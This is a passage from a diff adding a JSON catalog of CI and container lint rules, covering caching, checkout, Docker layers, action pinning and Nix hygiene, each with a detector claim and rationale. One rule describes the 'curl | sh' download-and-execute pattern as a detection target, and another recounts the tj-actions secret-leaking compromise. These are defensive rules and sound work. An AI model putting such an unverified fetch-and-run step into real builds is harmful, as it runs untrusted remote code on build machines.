+        "rationale": "In a monorepo most pull requests touch one area, yet every job still provisions a runner, restores caches, and installs dependencies. A small change-detection job that feeds job-level `if:` conditions skips the unrelated jobs entirely. Agent-driven repositories open many narrow pull requests, so the savings compound, and an always-run gate job keeps branch protection simple because skipped jobs report success."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "affected/path-filter-required-checks",
+      "metadataSha256": "c0191a7d7c57127677d35f8b835f2b6dc783634f57b0475409096e6728ed6057",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Pull request workflows should not skip themselves with trigger-level `paths` filters if they provide required checks."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When `paths`/`paths-ignore` skips a pull request workflow, its checks never report and stay Pending, so a pull request that requires them cannot merge. Agents then stall or someone adds a bypass. Running the workflow on every pull request and skipping work with job-level `if:` conditions keeps the speed benefit: skipped jobs report success, and an always-run gate job gives branch protection one stable check."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "affected/test-selection",
+      "metadataSha256": "0aa3bea5c4f9c5ece15966efed7910e0dcd1c47f63c03a8c4c602b8a7747674a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Pull request CI in a monorepo should test only the projects affected by the change."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Running every project's tests on every pull request makes CI time grow with the size of the repository instead of the size of the change. Agents open many small pull requests, so affected-only selection (nx affected, turbo --affected, pnpm `[ref]` filters, lerna --since) is the biggest lever for keeping feedback fast and runner minutes bounded."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "affected/trusted-change-detection",
+      "metadataSha256": "837638e02420d28d6e3ce4df9e1e98840ea2d0e705a52018f7cef86747003bfe",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Change-detection steps must not use tj-actions/changed-files versions affected by CVE-2025-30066."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Change detection runs on every pull request, often with secrets in scope. In March 2025 the tags of tj-actions/changed-files were repointed to a malicious commit that dumped runner memory, including secrets, into workflow logs (CVE-2025-30066). Versions before v46.0.1 are in the advisory's affected range; agents copying an old snippet reintroduce it."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/build-tool-cache",
+      "metadataSha256": "5c8f0bf933197907204b9d2eacbfeb31a4f5e6ed94ea24e5857e0fe683b07604",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Build tools with their own caches (Gradle, Maven, Cargo, Bazel, Turborepo, Nx) should persist them between runs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Gradle, Maven, Cargo, Bazel, Turborepo and Nx can reuse downloads or build outputs when compatible caches are warm. Fresh runners often lack that state, but remote caches, preinstalled dependencies and tool-specific invalidation can change the benefit. A missing visible cache is a candidate for measurement, not proof that all work is repeated or that adding a cache will be faster."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/cache-key",
+      "metadataSha256": "c858450436d660bc6aef0b3a9701e8cd1e6bd670cbafbc5124d8969c6d0346cb",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "actions/cache keys must invalidate when inputs change and still hit between runs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A static primary key does not encode dependency changes. SHA/run-scoped keys can prevent reuse across different context values, although reruns can reuse a key and Actions cache scope/version, prefix lookup and eviction also affect hits. Whether removing a context is safe depends on the workload's actual dependencies. `formal cache-key` checks only an explicit primary-key string-partition model relative to declared dependencies; it does not prove hits or speedups. Restoring node_modules before an unconditional `npm ci` is usually wasteful because npm ci removes that directory."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": [
+        "cache-primary-key-partition-relative-to-declared-D"
+      ]
+    },
+    {
+      "id": "caching/docker-layer-cache",
+      "metadataSha256": "9390298b6f82374e5fed63be4214c779101c32d8615d09651649aa0ca509219a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Docker image builds in CI should import and export a layer cache."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Fresh BuildKit builders may repeat expensive layers without reusable cache state; remote or persistent builders can differ. The GitHub Actions backend's default `buildkit` scope can cause builds to overwrite one another's exported cache. Separate scopes and appropriate import/export settings may improve reuse, but transfer overhead and invalidation still require measurement. Inline cache supports mode=min; a registry cache with mode=max can include intermediate stages."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/matrix-cache-key-missing-os",
+      "metadataSha256": "a77a9c628eedb19794c582ed33dce96be3e8f488818af08f3053deae92b9ca85",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Native-output cache keys should distinguish matrix platforms when modeled cache versions can overlap."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Cache matching depends on key, version and accessible branch scope. Versions include configured paths and compression details; Windows has additional cross-OS handling. Under the modeled hosted-runner/action behavior, equal visible inputs can permit incompatible native outputs to share a key. Custom compression, action versions or external configuration can change the version. Concurrent cold runs may all miss before a later run restores the winning cache. Changing keys must preserve every paired restore/save expression and caller, so no automatic rewrite is offered."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/pr-branch-cache-save",
+      "metadataSha256": "910c2d49876613b5256b6e0b2ed85c3ecd6af85512b972705d33023d7fe41ef3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A workflow that only runs on `pull_request` saves caches no other pull request or branch can restore."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A cache saved by a pull_request run is scoped to its merge ref and can be useful on subsequent commits or reruns of that pull request, but cannot seed other pull requests or the base branch. PR runs can also restore accessible base/default-branch caches with compatible keys and versions. No recognized non-PR writer in the inspected repository does not prove no cache exists: history, external workflows and other cache actions may supply one. Compare hit rates, transfer cost and storage policy before adding trusted-branch warming; do not remove useful PR writes automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/setup-cache",
+      "metadataSha256": "eae82b9409bb1a8744fe8989a0ab37b20936103e4fbdd52038b0bf718c7b8ddd",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Language setup actions should cache downloaded dependencies."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Dependency downloads can be a large repeated cost on fresh runners. An effective cache may reduce that cost, but prewarmed runners, external caches and restore/upload overhead can change the benefit; measure the affected job. setup-node, setup-python, setup-java and setup-dotnet support explicit `cache` settings (setup-node v6+ also auto-caches npm when package metadata selects npm); setup-go caches by default."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "caching/uncompressed-artifact-upload",
+      "metadataSha256": "d24912eb0fdc804ed17255ecdab089cc8786b20dd636c19fc3708d0364c8fdca",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Artifacts that only contain already-compressed files should be uploaded with `compression-level: 0`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Recognized actions/upload-artifact versions default to compression-level 6. Extensions such as .gz and .zip commonly identify compressed content, but archives may contain uncompressed entries and extension alone is not evidence of actual bytes or upload-time savings. Level 0 preserves extracted file contents but changes archive bytes, size and digest. Compare representative transfer/storage cost and consumer expectations before manually changing compression policy."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "checkout/affected-base-ref",
+      "metadataSha256": "be35d05e489005939ae7d98651fabb69b805a591b9672382d4a556fc96034b59",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Affected/changed-only commands need the base commit, which a default shallow checkout does not fetch."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`actions/checkout` fetches a single commit by default. Affected-only tooling (nx affected, turbo --affected, pnpm/turbo `[ref]` filters, jest --changedSince, git diff against the base) then either fails with an unknown revision or silently falls back to running everything, which defeats the selection that makes agent-scale CI affordable."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "checkout/partial-clone",
+      "metadataSha256": "fa2e53db222b503e755ac42b5458445e4e6656236eab845b22d9f9e31dec8df3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Full-history checkouts (`fetch-depth: 0`) should use a blobless partial clone (`filter: blob:none`)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`fetch-depth: 0` downloads every version of every file ever committed, which dominates checkout time in large or long-lived repositories. A blobless partial clone keeps the full commit graph that history-aware tools (affected detection, changelogs, versioning) need, and fetches file contents lazily only when a command reads them. Agent-driven repositories run many more jobs, so the saving compounds."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "checkout/sparse-checkout",
+      "metadataSha256": "50471dd5a25efc228a4bc2dbbea70abb16390ee6d19daa5767da9ccd2422e899",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Jobs that only work inside one workspace package of a large monorepo can use a sparse checkout."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "In large monorepos most of the checkout is files a package-scoped job never reads. A cone-mode sparse checkout of the package, its workspace dependencies, and shared config keeps checkout and disk usage proportional to the job, which adds up when agents trigger many small package-level runs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/apt-hygiene",
+      "metadataSha256": "426a78815455c501e7f4957429951f57b27ff6bdbbdfc61f8d203ba6a6d27e1f",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "apt and apk installs in Dockerfiles should skip recommended packages, update and install in one layer, and not leave package caches in the image."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Recommended packages and leftover package indexes add tens of megabytes to every layer that is pushed, pulled, and cached. `apt-get update` in its own RUN creates a layer that BuildKit keeps reusing, so later installs run against a stale index (or fail). Smaller layers mean faster pulls on every ephemeral CI runner and agent sandbox."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/buildx-load-multiplatform",
+      "metadataSha256": "51af50a69b35eb0e172fa200f44391a9cf95cb13f721b5e6be255216840bf97f",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Multi-platform image builds must not be loaded into the classic Docker image store of a GitHub-hosted runner."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The classic Docker image store cannot hold multi-platform images. Loading a multi-platform build therefore requires a compatible exporter and containerd image store, or a separate single-platform test build. Runner labels alone do not prove which store is enabled: hosted images change and workflows can address custom daemons. This is a compatibility check to verify, not a prediction that every such job fails."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/cache-mount",
+      "metadataSha256": "72d8237288915f71631ab2471eec240453b05ff80fe483f85c059805d39bac59",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Dependency installs and compiles in Dockerfiles should use BuildKit cache mounts for package-manager and compiler caches."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When a dependency layer is invalidated, a cache mount (`RUN --mount=type=cache`) lets the package manager reuse previously downloaded packages and compiler output instead of fetching everything again, and keeps those caches out of the image. Cache mounts live in the builder, so on ephemeral hosted runners pair them with a persistent builder or export them (for example with buildkit-cache-dance) to benefit across CI runs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/curl-pipe-shell",
+      "metadataSha256": "76fe440c3ff91556ec99392fb6dd5cbfad0232ced8bb7772e56be34f6decf803",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A script is downloaded and executed in one go (`curl | sh`, `bash <(curl ...)`) without checksum or signature verification."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A direct download-to-interpreter stream executes bytes before the complete payload can be checked locally. A checksum command elsewhere in the step, or a check after execution, does not verify that stream. Download to a file and require successful verification of that exact file before execution. Use an independently trusted expected digest or signing key. Verification authenticates payload bytes; it does not make the script, its network dependencies or the overall build hermetic."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/dependency-layer",
+      "metadataSha256": "1093f72ba0516750bdb5c0b4078e49561f0c5c93b1b647ba2e749e3b9e50c7da",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Dockerfiles should install dependencies from manifests and lockfiles before copying the rest of the source tree."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "BuildKit reuses a layer only while every input above it is unchanged. Copying the whole context before the install means each source edit (every agent iteration) re-downloads and re-installs all dependencies; copying only manifests and lockfiles first keeps the dependency layer cached until dependencies actually change."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/docker-no-cache-build",
+      "metadataSha256": "650b13c60d39ebd3515d06eed7ff2ce9da6abd284bd09e77118d045a24126dd3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Push and pull-request image builds should not pass --no-cache when they import a cache (cache-from) or run on a persistent self-hosted builder."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`--no-cache` bypasses reusable instruction results for the stages built; unused stages need not run, and cache mounts or external dependency caches can still help. A declared cache import or self-hosted builder does not prove a usable hit. `--pull` refreshes base-image resolution but does not refresh an otherwise cached RUN apt-get install or other mutable download. Preserve the project's freshness policy; measure cache hits and use intentional full or selected-stage rebuilds when required."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/dockerignore",
+      "metadataSha256": "d545f039c138655dd826277142496a031c75fd89e590cf6810e8ff64ee36f9db",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Docker build contexts that are copied into images should have a .dockerignore excluding .git and node_modules."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Without a .dockerignore, `COPY . .` sends and hashes the whole context, including `.git`, `node_modules`, and local build output. Every commit, install, or agent scratch file then changes the COPY checksum and invalidates that layer and everything after it, and large contexts slow down every build."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/gha-cache-missing-scope",
+      "metadataSha256": "75ccae27a10242c0a780777aa76af923956fcefe773cc1fed403d73214909556",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Consider distinct gha cache scopes for modeled build variants that can replace each other's cache index."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The gha backend's scope defaults to buildkit. Multiple exports sharing that scope can replace its index within the same repository/branch cache namespace. Some layers, local builder caches or other imports can still be reused; replacement is not proof of rebuilding from scratch. Scope expressions should distinguish relevant image/platform variants and agree across every importer/exporter. That cross-file contract is not established by this detector, so changes require review rather than automatic edits."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/gha-cache-mode-min",
+      "metadataSha256": "6aaef1882a9b789d208a76f250756a3162e94d2431ff77acc7ec1f620bc5f57a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A multi-stage build exports a minimal cache that omits intermediate-stage layers."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "BuildKit's mode=min export includes layers in the resulting image, not all intermediate-stage layers. A fresh builder relying only on that export may repeat intermediate work; local caches and other exporters can still avoid it. mode=max exports intermediate layers too, which can increase transfer/storage and disclose source or sensitive files intentionally omitted from the final image. Review cache access, secret handling and measured benefit before opting in; this is not a safe automatic edit."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/multi-stage",
+      "metadataSha256": "e65ae2cf0a5faf9c4f88b57be1a7f8cd96c4f9726bb592a28e37699450264ffc",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Single-stage Dockerfiles that install build toolchains or dev dependencies should use a builder stage and a minimal runtime stage."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Compilers, git, and devDependencies are only needed to build. Shipping them makes every pull, push, and layer upload larger and slower (and widens the attack surface). A multi-stage build compiles in a builder stage and copies only artifacts into a slim or distroless runtime stage; BuildKit also builds independent stages in parallel."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/pnpm-fetch-docker-layer",
+      "metadataSha256": "3cecc210c659e852dcb33dc8b696ec9408aed2bd7057dcbe7d4b61ec58ce9fc5",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A pnpm-workspace Dockerfile copies every workspace package.json before `pnpm install` instead of warming the store with `pnpm fetch`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Copying workspace manifests before installation can invalidate the install layer on non-dependency edits. A warm pnpm store or cache mount may already avoid downloads. pnpm fetch can separate dependency fetching from manifest changes, but also depends on pnpm version, workspace configuration, patches, authentication and relevant build inputs. An offline install still performs linking and may run lifecycle scripts. Preserve frozen-lock policy and all required inputs, then benchmark."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/qemu-emulated-multiarch",
+      "metadataSha256": "fd58f38070f08d531f11e424dc00c9564404351d83997571e89920fe25ddc477",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Potentially emulated multi-platform builds are candidates for measured native-runner or cross-compilation alternatives."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Registering QEMU and requesting a foreign platform does not establish that build steps execute under emulation: native remote nodes, fixed-platform stages, cross-compilation, pruning and cache hits may avoid it. Where measurements show emulated compilation/compression, native nodes or cross-compilation can help. Compare full build and publication costs, verify hosted-runner availability, and preserve every platform, tag, artifact and test requirement."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/runtime-tool-install-vs-container",
+      "metadataSha256": "50950938f32dc918249102302bde5f5d2b08446988609699fb518a7dc289ae8d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "The same tools are installed at runtime in several jobs instead of being baked into a job container image."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Repeated tool installation specifications may be worth consolidating, but downloads can already be cached and versions may already be pinned. A job container replaces installation work with image build/pull/maintenance costs and changes OS, user, shell, networking and action compatibility. Tags are mutable: a reviewed image digest identifies the intended image. Benchmark and validate the migration; repeated command text is not proof of repeated network work or equivalent artifacts."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/shared-base",
+      "metadataSha256": "eea63cfbc9a4c8151cea98eccb39877786d3bb344a70e2ce0fde6c5575ba7cbf",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review repeated base-image and toolchain preambles for possible shared-base reuse."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A published shared base can move repeated toolchain installation into a separate build, but existing layer caches may already reuse that work. Compare build savings with publication and image-pull costs, preserve platform and per-service requirements, and maintain reviewed digest updates. Matching preamble text alone does not prove equivalent execution or a speedup."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "containers/sleep-polling-health-check",
+      "metadataSha256": "7974e1f7309b82f0d1485341c5dac32922e5fa78d41cb1e1c6e4a5474d4215c4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A job with service containers waits for them with a fixed `sleep` instead of a `--health-cmd` health check."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A fixed sleep may wait longer than a useful readiness probe or fail on a slow start. However, the image may already define HEALTHCHECK and the sleep may await unrelated work. An explicit probe helps only if it tests the same readiness condition; polling intervals, retries and credentials affect correctness and latency. This rule observes a sleep and absent workflow-level health command, not the image's configuration or the sleep's purpose."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/docker-base-digest",
+      "metadataSha256": "0315481c809df21356dd5fd7985c1b56c16e05d813979912cab7ed7247adf3a7",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Dockerfile base images should use pinned versions (and digests when required)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Untagged and latest-tag base images can change when their registry tags move, affecting build inputs and layer reuse. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not make the entire build reproducible, because downloads, toolchains and other inputs may still vary."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/frozen-lockfile",
+      "metadataSha256": "451f2dfa7fbbd12e9f2890b0f1c1550ada0ab78939587f1f80ea2a4dc95091a4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI installs must be locked to the committed lockfile."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`npm install` and unfrozen yarn/bun installs can rewrite the lockfile and resolve different versions per run, which breaks reproducibility and cache keys. Frozen installs are also faster."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/pin-actions",
+      "metadataSha256": "428a509988c70abef3b8ea941952d3929df6d906cae55412ee2e4a8a0a1c22ac",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Third-party actions and reusable workflows should be pinned to a full commit SHA."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Tags and branches can be moved, so `@v4` may run different code tomorrow than today, which breaks reproducibility and is a supply-chain risk. A full-length commit SHA is immutable. (OpenSSF Scorecard also treats a tag backed by an immutable release as pinned, but most action tags are not immutable releases and this cannot be verified offline.)"
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/pin-container-images",
+      "metadataSha256": "7bdfd2926d9ba7576d59dfcabc48635266a4abe0469488939706dce8397b5c18",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Job containers and service containers should use pinned image versions."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Untagged and latest-tag images can change between runs when registry tags move. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not establish reproducibility of the full job or of mutable external dependencies."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "hermeticity/pin-runner",
+      "metadataSha256": "301a5280a0bc9f51e80b04e455097e8f828c3f83618c486e47f42c62f1e2f013",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Jobs should run on a pinned runner image label instead of `*-latest`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`ubuntu-latest`, `windows-latest` and `macos-latest` move to a new OS image during a gradual multi-week rollout, so identical commits can pass on one run and fail on the next with different toolchains and preinstalled software. `ubuntu-latest` is migrating from Ubuntu 24.04 to 26.04 between Oct 19 and Nov 19, 2026. Pinning makes the upgrade a deliberate, reviewable change."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/accept-flake-config-untrusted",
+      "metadataSha256": "c6610d8a0d9ec908e693209f9d7bc8859f744f0fd28b2f2205f789a68d4935f3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix accepts `nixConfig` from flakes that a pull request can modify."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "accept-flake-config allows eligible nixConfig settings from an evaluated flake without the usual confirmation. If a pull request controls that flake, it can influence settings such as substituters and trusted keys. Which settings take effect, and with what privilege, depends on Nix version, single-user versus daemon installation, trusted-user policy and CLI overrides; this detector does not establish root execution or cache compromise. Keep configuration policy outside untrusted flake content, especially when pull_request_target checks out the head or a persistent runner/cache is exposed. Disabling this setting alone does not make executing untrusted workflow code safe."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/builtins-fetchurl-unverified",
+      "metadataSha256": "adf1fc97414e9fcdfe7c740dad8cb4e2858df61aac68090f885cb8120141b6b5",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`builtins.fetchurl` downloads at evaluation time without an integrity check; pin it with `sha256` or use the `pkgs.fetchurl` fixed-output fetcher."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When demanded, an unpinned builtins.fetchurl call lacks a declared expected content digest. Download/cache behavior depends on Nix settings and availability, and pure evaluation rejects an unpinned demanded fetch. Importing the result may evaluate remote Nix code. A reviewed digest constrains bytes, not source trust or whole-build reproducibility. pkgs.fetchurl is a build-time fixed-output fetcher; substituting it into evaluation-time code can introduce IFD, so it is not a universally equivalent replacement."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/channel-in-ci",
+      "metadataSha256": "e112f5fde4b3003bdaa156af95ff090d822cacb822cca637da7380fc803d6692",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`nix-channel --add/--update` in CI makes evaluation depend on a channel that moves."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Channel subscriptions live outside the Nix expressions consuming them. A mutable channel URL can resolve differently after an update, while immutable snapshots, explicit search paths and recorded revisions can constrain or document the selection. Adding a channel alone does not establish that a build uses it. Prefer an explicit, reviewed dependency policy where frozen inputs are required; this detector does not establish reproducibility or the presence/absence of runtime provenance."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/current-system-builtin",
+      "metadataSha256": "bb7e3b65b36a52168af9a44f75b3ce3a0fa6cb8dd5dcb41c5f6faf4c89cdc98c",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix expressions should not read `builtins.currentSystem`, the platform of the machine running the evaluation."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "builtins.currentSystem reads the evaluator's system/eval-system setting, not necessarily a remote builder's platform. If the value influences a derivation, different settings can select different outputs. Pure evaluation removes this constant, so a demanded reference fails; unused lazy expressions need not fail. Passing a system explicitly documents platform selection, but does not make different target platforms equivalent or prove reproducibility."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/dev-shell-reinvoked-per-step",
+      "metadataSha256": "5c9dd2195f8e25fc07dd8f3458f7628f055075b914e9d5f13a23f5071cf4b488",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
